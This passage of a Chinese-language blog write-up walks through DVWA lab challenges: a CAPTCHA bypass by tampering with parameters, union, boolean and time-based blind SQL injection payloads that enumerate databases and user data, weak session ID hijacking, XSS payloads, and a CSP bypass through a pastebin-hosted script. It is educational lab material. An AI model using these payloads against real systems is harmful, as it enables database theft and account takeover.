];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line">    <span class="variable">$resp</span> = <span class="title function_ invoke__">recaptcha_check_answer</span>(</span><br><span class="line">        <span class="variable">$_DVWA</span>[ <span class="string">&#x27;recaptcha_private_key&#x27;</span>],</span><br><span class="line">        <span class="variable">$_POST</span>[<span class="string">&#x27;g-recaptcha-response&#x27;</span>]</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Did the CAPTCHA fail?</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="variable">$resp</span> ) &#123;</span><br><span class="line">        <span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line">        <span class="variable">$html</span>     .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// CAPTCHA was correct. Do both new passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">            <span class="comment">// Show next stage for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">                &lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;</span></span><br><span class="line"><span class="string">                &lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;<span class="subst">&#123;$pass_new&#125;</span>\&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;<span class="subst">&#123;$pass_conf&#125;</span>\&quot; /&gt;</span></span><br><span class="line"><span class="string">                    &lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt;</span></span><br><span class="line"><span class="string">                &lt;/form&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Both new passwords do not match.</span></span><br><span class="line">            <span class="variable">$html</span>     .= <span class="string">&quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">            <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) &amp;&amp; ( <span class="variable">$_POST</span>[ <span class="string">&#x27;step&#x27;</span> ] == <span class="string">&#x27;2&#x27;</span> ) ) &#123;</span><br><span class="line">    <span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line">    <span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check to see if both password match</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_real_escape_string</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((<span class="title function_ invoke__">trigger_error</span>(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        <span class="variable">$pass_new</span> = <span class="title function_ invoke__">md5</span>( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update database</span></span><br><span class="line">        <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . <span class="title function_ invoke__">dvwaCurrentUser</span>() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="title function_ invoke__">mysqli_query</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="title function_ invoke__">is_object</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_connect_error</span>()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the end user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with the passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((<span class="title function_ invoke__">is_null</span>(<span class="variable">$___mysqli_res</span> = <span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>源码的大概逻辑就是首先第一步服务器会向谷歌服务器验证验证码的正确性，如果通过验证，那么会返回一个修改密码的表单给客户端，第二步就是客户端提交修改密码的表单完成改密操作</p>
+<p>发现只有step&#x3D;1时进行了验证，而step&#x3D;2时会直接进行修改密码的操作，那么我们通过bp抓包修改报文，可以直接绕过第一步</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214221601379.png" alt="image-20210214221601379"></p>
+<p>修改参数，然后发送修改后的报文，成功绕过验证码然后修改密码</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214221647311.png" alt="image-20210214221647311"></p>
+<h2 id="0x07-SQL-Injection"><a href="#0x07-SQL-Injection" class="headerlink" title="0x07 SQL Injection"></a>0x07 SQL Injection</h2><p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214223004305.png" alt="image-20210214223004305"></p>
+<p>sql注入，就是利用网站对于输入的查询信息过滤并不是很完全，通过构造的payload，实现sql语句的非法执行</p>
+<p>首先第一步，判断是否有sql注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214222823064.png" alt="image-20210214222823064"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and &#x27;1&#x27;=&#x27;2</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214222846321.png" alt="image-20210214222846321"></p>
+<p>通过两个语句不同的回显，说明执行了后面的and逻辑判断，说明存在sql注入漏洞</p>
+<p>然后可以通过order by 函数，来判断查询语句中有多少列</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 1#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214223202800.png" alt="image-20210214223202800"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; order by 3#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214223139643.png" alt="image-20210214223139643"></p>
+<p>说明查询语句中有两列，然后可以进行union联合查询</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,2#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214223501051.png" alt="image-20210214223501051"></p>
+<p>判断回显位置之后，然后可以通过mysql内置的数据库查询库名表名和数据</p>
+<p>爆数据库名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,schema_name from information_schema.schemata#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210214223758168.png" alt="image-20210214223758168"></p>
+<p>然后可以通过同样的方法获得表名，列名，数据</p>
+<p>汇总sql注入常用数据库信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql存储所有数据库信息的数据库: information_schema</span><br><span class="line">其中所含的表 </span><br><span class="line">information_schema.schemata 提供所有数据库信息  </span><br><span class="line">列: schema_name 存储数据库名</span><br><span class="line">information_schema.tables 提供关于数据库中的表信息 </span><br><span class="line">列: table_name 存储表名 table_schema 存储表属于哪个数据库</span><br><span class="line">information_schema.columns 提供了表中的列信息 </span><br><span class="line">列: table_schema 存储列属于哪个数据库 table_name 存储列属于哪个表 column_name 存储列名</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x08-SQL-Injection-Blind"><a href="#0x08-SQL-Injection-Blind" class="headerlink" title="0x08 SQL Injection (Blind)"></a>0x08 SQL Injection (Blind)</h2><p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210223182735729.png" alt="image-20210223182735729"></p>
+<p>SQL盲注与一般注入的区别在于一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示 页面上获取执行的结果，甚至连注入语句是否执行都无法得知。</p>
+<p>所以sql盲注分为：基于布尔的盲注、基于时间的盲注、基于报错的盲注</p>
+<h3 id="1-基于布尔的盲注"><a href="#1-基于布尔的盲注" class="headerlink" title="1.基于布尔的盲注"></a>1.基于布尔的盲注</h3><p>首先还是要判断是否存在sql注入漏洞，并且判断是基于字符还是基于数字</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and 1=1#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210223183546686.png" alt="image-20210223183546686"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and 1=2#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210223183600444.png" alt="image-20210223183600444"></p>
+<p>可以判断出是字符型的sql盲注</p>
+<p>然后利用and判断来猜当前数据库名长度</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and length(database())=1#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210223193310818.png" alt="image-20210223193310818"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and length(database())=4#</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210223193340425.png" alt="image-20210223193340425"></p>
+<p>说明数据库名长度为4，然后可以通过二分法进行爆破数据库名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr(databse(),1,1))&gt;97#  （97为小写字母a的ascii值，122为z的ascii值）</span><br><span class="line">1&#x27; and ascii(substr(databse(),1,1))&lt;122#</span><br></pre></td></tr></table></figure>
+
+<p>可知数据库名为：dvwa</p>
+<p>利用这样的查询语句可以依次猜解出数据库的名称</p>
+<p>然后猜解数据库中的表的个数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select count(table_name) from information_schema.tables where table_schema=database())=1#</span><br></pre></td></tr></table></figure>
+
+<p>然后就可以知道当前数据库中的表的个数</p>
+<p>然后猜解数据库中表名的长度,使用下面的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1#</span><br></pre></td></tr></table></figure>
+
+<p>使用二分法依次猜解数据库中的表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97#</span><br><span class="line">1&#x27; and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;122#</span><br></pre></td></tr></table></figure>
+
+<p>可知数据库中两个表名分别为：guestbook users</p>
+<p>然后猜解users表中字段的数量</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and (select count(column_name) from information_schema.columns where table_name=&#x27;users&#x27;)=1#</span><br></pre></td></tr></table></figure>
+
+<p>然后同样猜解users表中每个字段的长度</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and length(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1))=1#</span><br></pre></td></tr></table></figure>
+
+<p>然后使用二分法猜解users表中每个字段名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 0,1),1,1))=1#</span><br></pre></td></tr></table></figure>
+
+<p>limit 0,1 :确定是表的第几个字段</p>
+<p>substr(str,1) : 从第一个位置开始截取str字符串之后的所有字符</p>
+<p>substr(str,1,1) : 截取字符串str从第一个位置开始之后的一个字符</p>
+<p>知道了数据库名，表名，列名，然后就可以继续通过二分法来爆破其中的数据</p>
+<p>猜解dvwa数据库中的users表中的first_name字段中的数据</p>
+<p>首先猜解字段长度</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and length(substr((select first_name from dvwa.users limit 0,1),1))=1#</span><br></pre></td></tr></table></figure>
+
+<p>然后用二分法猜解数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and ascii(substr((select first_name from dvwa.users limit 0,1),1,1))&gt;97#</span><br><span class="line">1&#x27; and ascii(substr((select first_name from dvwa.users limit 0,1),1,1))&gt;122#</span><br></pre></td></tr></table></figure>
+
+<p>然后可以根据这样的思路步骤编写python脚本，效率会很高</p>
+<h3 id="2-基于时间的盲注"><a href="#2-基于时间的盲注" class="headerlink" title="2.基于时间的盲注"></a>2.基于时间的盲注</h3><p>原理就是加入sleep()函数，如果猜解正确网页回显会变慢</p>
+<p>思路步骤还是和布尔盲注一样，只是payload有所不同</p>
+<p>判断是否存在时间盲注</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and sleep(5)#  判断字符型</span><br><span class="line">1 and sleep(5)#  判断数字型</span><br></pre></td></tr></table></figure>
+
+<p>猜解数据库长度，名称</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(length(database())=1,sleep(5),1)#  猜解长度</span><br><span class="line">1&#x27; and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)# 二分法猜解名称</span><br></pre></td></tr></table></figure>
+
+<p>猜解数据库中的表数量，表名长度，表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(5),1)# 猜解表个数</span><br><span class="line">1&#x27; and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(5),1)# 猜解表名长度</span><br><span class="line">1&#x27; and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97,sleep(5),1)# 二分法猜解表名</span><br></pre></td></tr></table></figure>
+
+<p>猜解表中的字段数量，字段长度，字段名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if((select count(column_name) from information_schema.columns where table_name= ’users’)=1,sleep(5),1)# 猜解字段数量</span><br><span class="line">1&#x27; and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1,sleep(5),1)# 猜解字段名长度</span><br><span class="line">1&#x27; and if(ascii(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1,1))&gt;97,sleep(5),1)# 二分法猜解字段名</span><br></pre></td></tr></table></figure>
+
+<p>同样使用二分法猜解具体表中某字段的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; and if(ascii(substr((select first_name from dvwa.users limit 0,1),1,1))&gt;97,sleep(5),1)#</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x09-Weak-Session-IDs"><a href="#0x09-Weak-Session-IDs" class="headerlink" title="0x09 Weak Session IDs"></a>0x09 Weak Session IDs</h2><p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210223205921151.png" alt="image-20210223205921151"></p>
+<p>当用户登录后，在服务器就会创建一个会话(session)，叫做会话控制，接着访问页面的时候就不用登录，只需要携带session去访问。sessionID作为特定用户访问站点所需要的唯一内容。如果能够计算或轻易猜到该sessionID，则攻击者将可以轻易获取访问权限，无需登录直接进入特定用户界面，进而进行其他操作。</p>
+<p>用户访问服务器的时候，在服务器端会创建一个新的会话(Session)，会话中会保存用户的状态和相关信息，用于标识用户。服务器端维护所有在线用户的Session，此时的认证，只需要知道是哪个用户在浏览当前的页面即可。为了告诉服务器应该使用哪一个Session，浏览器需要把当前用户持有的SessionID告知服务器。用户拿到session id就会加密后保存到 cookies  上，之后只要cookies随着http请求发送服务器，服务器就知道你是谁了。SessionID一旦在生命周期内被窃取，就等同于账户失窃。</p>
+<p>使用bp抓包，查看session生成方式</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224182729674.png" alt="image-20210224182729674"></p>
+<p>可以发现，每次新生成的session都是在原来的数值基础上+1</p>
+<p>通过这种简单的构造方式，将session劫持后，可以利用session直接绕过输入用户名和密码</p>
+<p>使用hackbar实现绕过，此时dvwaSession&#x3D;1</p>
+<p>首先登出</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210223211121290.png" alt="image-20210223211121290"></p>
+<p>然后配置hackbar</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224182957097.png" alt="image-20210224182957097"></p>
+<p>执行之后直接登入页面</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224183019365.png" alt="image-20210224183019365"></p>
+<h2 id="0x0A-DOM-Based-Cross-Site-Scripting-XSS"><a href="#0x0A-DOM-Based-Cross-Site-Scripting-XSS" class="headerlink" title="0x0A DOM Based Cross Site Scripting (XSS)"></a>0x0A DOM Based Cross Site Scripting (XSS)</h2><p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224183155070.png" alt="image-20210224183155070"></p>
+<p>DOM型xss的产生并没有和服务器进行交互，而是通过浏览器的dom树解析产生的。例如服务器端经常使用document.boby.innerHtml等函数动态生成html页面，如果这些函数在引用某些变量时没有进行过滤或检查，就会产生DOM型的XSS。DOM型XSS可能是存储型，也有可能是反射型。</p>
+<p>可以看到在选择之前</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224183539921.png" alt="image-20210224183539921"></p>
+<p>选择之后将所选内容插入到了网页html中</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224183608654.png" alt="image-20210224183608654"></p>
+<p>构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.0.104/DVWA-master/vulnerabilities/xss_d/?default=&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224184426194.png" alt="image-20210224184426194"></p>
+<h2 id="0x0B-Reflected-Cross-Site-Scripting-XSS"><a href="#0x0B-Reflected-Cross-Site-Scripting-XSS" class="headerlink" title="0x0B Reflected Cross Site Scripting (XSS)"></a>0x0B Reflected Cross Site Scripting (XSS)</h2><p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224184528292.png" alt="image-20210224184528292"></p>
+<p>反射性xss，就是注入的代码并没有存储在服务器端</p>
+<p>直接输入payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224185300140.png" alt="image-20210224185300140"></p>
+<p>bp抓包查看payload</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224185403335.png" alt="image-20210224185403335"></p>
+<h2 id="0X0C-Stored-Cross-Site-Scripting-XSS"><a href="#0X0C-Stored-Cross-Site-Scripting-XSS" class="headerlink" title="0X0C Stored Cross Site Scripting (XSS)"></a>0X0C Stored Cross Site Scripting (XSS)</h2><p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224185444851.png" alt="image-20210224185444851"></p>
+<p>存储型xss，就是注入的代码会存储在服务器端，最常见的就是留言板类型</p>
+<p>直接输入payload</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224185556703.png" alt="image-20210224185556703"></p>
+<p>注入成功</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224185622995.png" alt="image-20210224185622995"></p>
+<p>bp抓包发现是通过post方式传递数据</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224185731482.png" alt="image-20210224185731482"></p>
+<h2 id="0x0D-Content-Security-Policy-CSP-Bypass"><a href="#0x0D-Content-Security-Policy-CSP-Bypass" class="headerlink" title="0x0D Content Security Policy (CSP) Bypass"></a>0x0D Content Security Policy (CSP) Bypass</h2><p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224190122046.png" alt="image-20210224190122046"></p>
+<p>Content Security Policy(CSP)，内容（网页）安全策略，为了缓解潜在的跨站脚本问题(XSS攻击)，浏览器的扩展程序系统引入了内容安全策略（CSP）这个概念。具体内容可以参见《<a target="_blank" rel="noopener" href="http://www.ruanyifeng.com/blog/2016/09/csp.html">Content Security Policy 入门教程</a>》<br> 在先前的XSS攻击介绍中，主要都是利用函数过滤&#x2F;转义输入中的特殊字符，标签，文本来应对攻击。CSP则是另外一种常用的应对XSS攻击的策略。<br> CSP 的实质就是白名单制度，开发者明确告诉客户端，哪些外部资源可以加载和执行，等同于提供白名单。它的实现和执行全部由浏览器完成，开发者只需提供配置。<br> 两种方法可以启用 CSP。</p>
+<ul>
+<li>一种是通过 HTTP 响应头信息的Content-Security-Policy字段。</li>
+<li>一种是通过网页的标签。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &#x27;self&#x27;; object-src &#x27;none&#x27;; style-src cdn.example.org third-party.org; child-src https:&quot;&gt;</span><br><span class="line">1</span><br></pre></td></tr></table></figure>
+
+<p>关于HTTP中CSP说明参见 <a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/section/1189835">https://cloud.tencent.com/developer/section/1189835</a><br> 以上例子中的说明如下：</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/section/1189876">script-src</a>，脚本：只信任当前域名</li>
+<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/section/1189870">object-src</a>：不信任任何URL，即不加载任何资源</li>
+<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/section/1189877">style-src</a>，样式表：<a target="_blank" rel="noopener" href="http://只信任cdn.example.org和third-party.org/">只信任cdn.example.org和third-party.org</a></li>
+<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/section/1189860">child-src</a>：必须使用HTTPS协议加载。这个已从Web标准中删除，新版本浏览器可能不支持。</li>
+<li>其他资源：没有限制其他资源</li>
+</ol>
+<p>启用CSP后，不符合 CSP 的外部资源就会被阻止加载。</p>
+<p>使用bp抓包网页查看响应头</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224190322082.png" alt="image-20210224190322082"></p>
+<p>可以看到只允许pastebin.com等网站执行js</p>
+<p>那么可以在pastebin.com写一个注入文本，然后访问执行</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224191650414.png" alt="image-20210224191650414"></p>
+<p>会生成一个链接<a target="_blank" rel="noopener" href="https://pastebin.com/raw/zSLDySJn">https://pastebin.com/raw/zSLDySJn</a></p>
+<p>然后输入链接成功执行js代码</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224191800340.png" alt="image-20210224191800340"></p>
+<p>这说明使用csp时，还是要允许受信任的网站，这种随意留言的网站是不安全的</p>
+<h2 id="0x0E-JavaScript-Attacks"><a href="#0x0E-JavaScript-Attacks" class="headerlink" title="0x0E JavaScript Attacks"></a>0x0E JavaScript Attacks</h2><p><img src="C:\Users\13378\AppData\Roaming\Typora\typora-user-images\image-20210224192459112.png" alt="image-20210224192459112"></p>
+<p>可以看到要求提交success就成功</p>
+<p>先提交</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224192550294.png" alt="image-20210224192550294"></p>
+<p>显示token错误，bp抓包查看post的数据</p>
+<p><img src="https://ka1t4v.oss-cn-zhangjiakou.aliyuncs.com/image-20210224192439689.png" alt="image-20210224192439689"></p>
+<p>发现他同时生成了一个token，应该和服务器端比较，比较成功即通关，那么这个token是哪来的呢，查看网页源码发现有js脚本</p>
